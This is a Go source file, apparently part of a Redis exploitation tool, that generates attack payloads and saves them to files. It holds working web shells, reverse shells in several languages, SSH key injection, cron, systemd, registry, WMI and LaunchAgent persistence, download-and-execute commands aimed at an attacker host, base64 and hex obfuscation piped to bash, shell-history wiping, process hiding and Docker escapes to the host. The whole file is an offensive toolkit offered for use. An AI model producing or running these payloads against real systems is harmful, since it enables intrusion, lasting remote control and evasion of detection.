package utils

import (
	"0xRedisis/modules/core"
	"bufio"
	"encoding/base64"
	"fmt"
	"os"
	"strings"
	"time"
)

func PayloadGenerator(client *core.RedisClient) {
	fmt.Printf("\n%s=== Enhanced Payload Generator ===%s\n", core.ColorBlue, core.ColorNC)

	fmt.Printf("\n%s[*]%s Payload Categories:\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("%s1.%s Web shell payloads\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s2.%s Reverse shell payloads\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s3.%s SSH key payloads\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s4.%s Cron job payloads\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s5.%s Lua script payloads\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s6.%s Obfuscated payloads\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s7.%s Platform-specific payloads\n", core.ColorYellow, core.ColorNC)
	fmt.Print("\nEnter your choice (1-7): ")

	reader := bufio.NewReader(os.Stdin)
	choice, _ := reader.ReadString('\n')
	choice = strings.TrimSpace(choice)

	switch choice {
	case "1":
		generateWebShellPayloads(reader)
	case "2":
		generateReverseShellPayloads(reader)
	case "3":
		generateSSHKeyPayloads(reader)
	case "4":
		generateCronJobPayloads(reader)
	case "5":
		generateLuaScriptPayloads(reader)
	case "6":
		generateObfuscatedPayloads(reader)
	case "7":
		generatePlatformSpecificPayloads(reader)
	default:
		fmt.Printf("%s[-]%s Invalid choice\n", core.ColorRed, core.ColorNC)
	}
}

func generateWebShellPayloads(reader *bufio.Reader) {
	fmt.Printf("\n%s=== Web Shell Payload Generator ===%s\n", core.ColorBlue, core.ColorNC)

	payloads := map[string]string{
		"PHP Simple": `<?php if(isset($_GET['cmd'])) { echo "<pre>"; system($_GET['cmd']); echo "</pre>"; } ?>`,
		"PHP Advanced": `<?php
$pass = 'secret123';
if(isset($_GET['pass']) && $_GET['pass'] == $pass) {
    if(isset($_GET['cmd'])) {
        echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
    } else {
        echo "<form><input name='cmd'><input type='hidden' name='pass' value='$pass'><input type='submit'></form>";
    }
} else {
    http_response_code(404);
}
?>`,
		"ASP Simple": `<%
If Request.QueryString("cmd") <> "" Then
    Set objShell = Server.CreateObject("WScript.Shell")
    Response.Write("<pre>" & objShell.Exec(Request.QueryString("cmd")).StdOut.ReadAll & "</pre>")
End If
%>`,
		"JSP Simple": `<%
if(request.getParameter("cmd") != null) {
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    java.io.InputStream i = p.getInputStream();
    int c;
    while((c = i.read()) != -1) {
        out.print((char)c);
    }
}
%>`,
		"Python Flask": `from flask import Flask, request
import subprocess
app = Flask(__name__)
@app.route('/')
def cmd():
    c = request.args.get('cmd')
    if c:
        return '<pre>' + subprocess.check_output(c, shell=True).decode() + '</pre>'
    return 'Python Shell'
if __name__ == '__main__': app.run(host='0.0.0.0')`,
	}

	fmt.Printf("%s[*]%s Available web shell payloads:\n", core.ColorBlue, core.ColorNC)
	keys := []string{"PHP Simple", "PHP Advanced", "ASP Simple", "JSP Simple", "Python Flask"}

	for i, key := range keys {
		fmt.Printf("%s%d.%s %s\n", core.ColorYellow, i+1, core.ColorNC, key)
	}

	fmt.Print("\nSelect payload (1-5) or 'all' for all payloads: ")
	choice, _ := reader.ReadString('\n')
	choice = strings.TrimSpace(choice)

	if choice == "all" {
		for name, payload := range payloads {
			savePayloadToFile(name, payload, "webshell")
		}
	} else {
		idx := parseChoice(choice)
		if idx >= 0 && idx < len(keys) {
			name := keys[idx]
			savePayloadToFile(name, payloads[name], "webshell")
		}
	}
}

func generateReverseShellPayloads(reader *bufio.Reader) {
	fmt.Printf("\n%s=== Reverse Shell Payload Generator ===%s\n", core.ColorBlue, core.ColorNC)

	fmt.Print("Enter your IP address: ")
	ip, _ := reader.ReadString('\n')
	ip = strings.TrimSpace(ip)
	if ip == "" {
		ip = core.GetLocalIP()
	}

	fmt.Print("Enter port number: ")
	port, _ := reader.ReadString('\n')
	port = strings.TrimSpace(port)
	if port == "" {
		port = "4444"
	}

	payloads := map[string]string{
		"Bash TCP":   fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", ip, port),
		"Netcat":     fmt.Sprintf("nc -e /bin/bash %s %s", ip, port),
		"Python":     fmt.Sprintf(`python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('%s',%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i'])"`, ip, port),
		"PHP":        fmt.Sprintf(`php -r '$sock=fsockopen("%s",%s);exec("/bin/bash -i <&3 >&3 2>&3");'`, ip, port),
		"Ruby":       fmt.Sprintf(`ruby -rsocket -e 'f=TCPSocket.open("%s",%s).to_i;exec sprintf("/bin/bash -i <&%%d >&%%d 2>&%%d",f,f,f)'`, ip, port),
		"Perl":       fmt.Sprintf(`perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'`, ip, port),
		"PowerShell": fmt.Sprintf(`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('%s',%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`, ip, port),
	}

	fmt.Printf("%s[*]%s Available reverse shell payloads:\n", core.ColorBlue, core.ColorNC)
	keys := []string{"Bash TCP", "Netcat", "Python", "PHP", "Ruby", "Perl", "PowerShell"}

	for i, key := range keys {
		fmt.Printf("%s%d.%s %s\n", core.ColorYellow, i+1, core.ColorNC, key)
	}

	fmt.Print("\nSelect payload (1-7) or 'all' for all payloads: ")
	choice, _ := reader.ReadString('\n')
	choice = strings.TrimSpace(choice)

	if choice == "all" {
		for name, payload := range payloads {
			savePayloadToFile(name, payload, "revshell")
		}
	} else {
		idx := parseChoice(choice)
		if idx >= 0 && idx < len(keys) {
			name := keys[idx]
			savePayloadToFile(name, payloads[name], "revshell")
		}
	}
}

func generateSSHKeyPayloads(reader *bufio.Reader) {
	fmt.Printf("\n%s=== SSH Key Payload Generator ===%s\n", core.ColorBlue, core.ColorNC)

	fmt.Print("Enter your public key (or press Enter for demo key): ")
	pubkey, _ := reader.ReadString('\n')
	pubkey = strings.TrimSpace(pubkey)

	if pubkey == "" {
		pubkey = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGq... redis-exploit@demo"
	}

	payloads := map[string]string{
		"Direct Injection": pubkey,
		"Authorized Keys":  fmt.Sprintf("echo '%s' >> ~/.ssh/authorized_keys", pubkey),
		"Root SSH":         fmt.Sprintf("mkdir -p /root/.ssh && echo '%s' >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys", pubkey),
		"Multi-User SSH": fmt.Sprintf(`for user in root ubuntu www-data; do
  mkdir -p /home/$user/.ssh 2>/dev/null
  echo '%s' >> /home/$user/.ssh/authorized_keys 2>/dev/null
  chmod 600 /home/$user/.ssh/authorized_keys 2>/dev/null
done`, pubkey),
	}

	for name, payload := range payloads {
		savePayloadToFile(name, payload, "ssh")
	}

	fmt.Printf("%s[+]%s SSH key payloads generated\n", core.ColorGreen, core.ColorNC)
}

func generateCronJobPayloads(reader *bufio.Reader) {
	fmt.Printf("\n%s=== Cron Job Payload Generator ===%s\n", core.ColorBlue, core.ColorNC)

	fmt.Print("Enter your IP for reverse shell: ")
	ip, _ := reader.ReadString('\n')
	ip = strings.TrimSpace(ip)
	if ip == "" {
		ip = core.GetLocalIP()
	}

	payloads := map[string]string{
		"Every Minute Reverse Shell": fmt.Sprintf("* * * * * /bin/bash -i >& /dev/tcp/%s/4444 0>&1", ip),
		"Every 5 Minutes":            fmt.Sprintf("*/5 * * * * nc -e /bin/bash %s 5555", ip),
		"On Reboot":                  fmt.Sprintf("@reboot /bin/bash -i >& /dev/tcp/%s/6666 0>&1", ip),
		"Daily at Midnight":          fmt.Sprintf("0 0 * * * wget -O /tmp/payload http://%s/payload && chmod +x /tmp/payload && /tmp/payload", ip),
		"Persistence Cron":           fmt.Sprintf("*/10 * * * * if ! pgrep -f 'redis-shell'; then /bin/bash -i >& /dev/tcp/%s/7777 0>&1 & fi", ip),
	}

	for name, payload := range payloads {
		savePayloadToFile(name, payload, "cron")
	}

	fmt.Printf("%s[+]%s Cron job payloads generated\n", core.ColorGreen, core.ColorNC)
}

func generateLuaScriptPayloads(reader *bufio.Reader) {
	fmt.Printf("\n%s=== Lua Script Payload Generator ===%s\n", core.ColorBlue, core.ColorNC)

	payloads := map[string]string{
		"Command Execution": `
local handle = io.popen(ARGV[1])
local result = handle:read("*a")
handle:close()
return result`,
		"File Read": `
local file = io.open(ARGV[1], "r")
if file then
    local content = file:read("*a")
    file:close()
    return content
else
    return "Cannot read file"
end`,
		"File Write": `
local file = io.open(ARGV[1], "w")
if file then
    file:write(ARGV[2])
    file:close()
    return "File written"
else
    return "Cannot write file"
end`,
		"Reverse Shell": fmt.Sprintf(`
os.execute('bash -i >& /dev/tcp/%s/8888 0>&1 &')
return "Reverse shell initiated"`, core.GetLocalIP()),
		"Directory Listing": `
local handle = io.popen('ls -la ' .. (ARGV[1] or '.'))
local result = handle:read("*a")
handle:close()
return result`,
		"System Info": `
local info = {}
local handle = io.popen('uname -a')
info.uname = handle:read("*a")
handle:close()

handle = io.popen('whoami')
info.user = handle:read("*a")
handle:close()

handle = io.popen('pwd')
info.pwd = handle:read("*a")
handle:close()

return cjson.encode(info)`,
	}

	for name, payload := range payloads {
		savePayloadToFile(name, payload, "lua")
	}

	fmt.Printf("%s[+]%s Lua script payloads generated\n", core.ColorGreen, core.ColorNC)
}

func generateObfuscatedPayloads(reader *bufio.Reader) {
	fmt.Printf("\n%s=== Obfuscated Payload Generator ===%s\n", core.ColorBlue, core.ColorNC)

	fmt.Print("Enter base command to obfuscate: ")
	baseCmd, _ := reader.ReadString('\n')
	baseCmd = strings.TrimSpace(baseCmd)

	if baseCmd == "" {
		baseCmd = "whoami"
	}

	payloads := map[string]string{
		"Base64 Encoded": base64.StdEncoding.EncodeToString([]byte(baseCmd)),
		"Hex Encoded":    fmt.Sprintf("%x", baseCmd),
		"URL Encoded":    strings.ReplaceAll(strings.ReplaceAll(baseCmd, " ", "%20"), "/", "%2F"),
		"Bash Variable":  fmt.Sprintf("cmd='%s'; $cmd", baseCmd),
		"Concatenated":   obfuscateWithConcatenation(baseCmd),
		"Reversed":       reverseObfuscation(baseCmd),
	}

	// Also create execution wrappers
	payloads["Base64 Decoder"] = fmt.Sprintf("echo '%s' | base64 -d | bash", payloads["Base64 Encoded"])
	payloads["Hex Decoder"] = fmt.Sprintf("echo '%s' | xxd -r -p | bash", payloads["Hex Encoded"])

	for name, payload := range payloads {
		savePayloadToFile(name, payload, "obfuscated")
	}

	fmt.Printf("%s[+]%s Obfuscated payloads generated\n", core.ColorGreen, core.ColorNC)
}

func generatePlatformSpecificPayloads(reader *bufio.Reader) {
	fmt.Printf("\n%s=== Platform-Specific Payload Generator ===%s\n", core.ColorBlue, core.ColorNC)

	fmt.Printf("%s[*]%s Platform Options:\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("%s1.%s Linux payloads\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s2.%s Windows payloads\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s3.%s macOS payloads\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s4.%s Docker container payloads\n", core.ColorYellow, core.ColorNC)
	fmt.Print("\nEnter platform choice (1-4): ")

	choice, _ := reader.ReadString('\n')
	choice = strings.TrimSpace(choice)

	switch choice {
	case "1":
		generateLinuxPayloads()
	case "2":
		generateWindowsPayloads()
	case "3":
		generateMacOSPayloads()
	case "4":
		generateDockerPayloads()
	}
}

func generateLinuxPayloads() {
	payloads := map[string]string{
		"Systemd Service": `[Unit]
Description=Redis Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target`,
		"Bash History Cleanup": "history -c && history -w && unset HISTFILE",
		"Process Hiding":       "mv /proc/self/comm /proc/self/comm.bak && echo 'kernel' > /proc/self/comm",
		"Crontab Injection":    "echo '* * * * * /bin/bash -i >& /dev/tcp/attacker/5555 0>&1' | crontab -",
		"SSH Key Persistence":  "mkdir -p ~/.ssh && echo 'ssh-rsa AAA...' >> ~/.ssh/authorized_keys",
	}

	for name, payload := range payloads {
		savePayloadToFile(name, payload, "linux")
	}

	fmt.Printf("%s[+]%s Linux-specific payloads generated\n", core.ColorGreen, core.ColorNC)
}

func generateWindowsPayloads() {
	payloads := map[string]string{
		"PowerShell Reverse Shell": `$client = New-Object System.Net.Sockets.TCPClient('attacker',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
		"Registry Persistence":     `reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Redis" /t REG_SZ /d "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\temp\payload.ps1"`,
		"Scheduled Task":           `schtasks /create /tn "RedisUpdate" /tr "powershell.exe -WindowStyle Hidden -File C:\temp\shell.ps1" /sc minute /mo 5`,
		"WMI Persistence":          `wmic process call create "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command & {IEX (New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')}"`,
	}

	for name, payload := range payloads {
		savePayloadToFile(name, payload, "windows")
	}

	fmt.Printf("%s[+]%s Windows-specific payloads generated\n", core.ColorGreen, core.ColorNC)
}

func generateMacOSPayloads() {
	payloads := map[string]string{
		"LaunchAgent": `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.redis.agent</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>bash -i &gt;&amp; /dev/tcp/attacker/4444 0&gt;&amp;1</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>`,
		"Bash Profile": `echo 'bash -i >& /dev/tcp/attacker/5555 0>&1 &' >> ~/.bash_profile`,
		"Cron Job":     `echo '*/5 * * * * /bin/bash -i >& /dev/tcp/attacker/6666 0>&1' | crontab -`,
	}

	for name, payload := range payloads {
		savePayloadToFile(name, payload, "macos")
	}

	fmt.Printf("%s[+]%s macOS-specific payloads generated\n", core.ColorGreen, core.ColorNC)
}

func generateDockerPayloads() {
	payloads := map[string]string{
		"Container Escape":     `docker run --rm -v /:/host -it alpine chroot /host bash`,
		"Privilege Escalation": `docker run --rm --privileged -v /:/host alpine chroot /host bash`,
		"Socket Abuse":         `docker -H unix:///var/run/docker.sock run --rm -v /:/host -it alpine chroot /host bash`,
		"Process Injection":    `docker exec -it $(docker ps -q | head -1) /bin/bash`,
	}

	for name, payload := range payloads {
		savePayloadToFile(name, payload, "docker")
	}

	fmt.Printf("%s[+]%s Docker-specific payloads generated\n", core.ColorGreen, core.ColorNC)
}

// Helper functions
func parseChoice(choice string) int {
	switch choice {
	case "1":
		return 0
	case "2":
		return 1
	case "3":
		return 2
	case "4":
		return 3
	case "5":
		return 4
	case "6":
		return 5
	case "7":
		return 6
	default:
		return -1
	}
}

func savePayloadToFile(name, payload, category string) {
	timestamp := time.Now().Format("20060102_150405")
	filename := fmt.Sprintf("payload_%s_%s_%s.txt", category,
		strings.ReplaceAll(strings.ToLower(name), " ", "_"), timestamp)

	file, err := os.Create(filename)
	if err != nil {
		fmt.Printf("%s[-]%s Failed to create %s: %s\n", core.ColorRed, core.ColorNC, filename, err.Error())
		return
	}
	defer file.Close()

	fmt.Fprintf(file, "# %s Payload - %s\n", category, name)
	fmt.Fprintf(file, "# Generated: %s\n\n", time.Now().Format(time.RFC3339))
	fmt.Fprintf(file, "%s\n", payload)

	fmt.Printf("%s[+]%s Payload saved: %s%s%s\n",
		core.ColorGreen, core.ColorNC, core.ColorYellow, filename, core.ColorNC)
}

func obfuscateWithConcatenation(cmd string) string {
	if len(cmd) < 2 {
		return cmd
	}

	mid := len(cmd) / 2
	return fmt.Sprintf("'%s''%s'", cmd[:mid], cmd[mid:])
}

func reverseObfuscation(cmd string) string {
	runes := []rune(cmd)
	for i, j := 0, len(runes)-1; i < j; i, j = i+1, j-1 {
		runes[i], runes[j] = runes[j], runes[i]
	}
	reversed := string(runes)
	return fmt.Sprintf("echo '%s' | rev | bash", reversed)
}
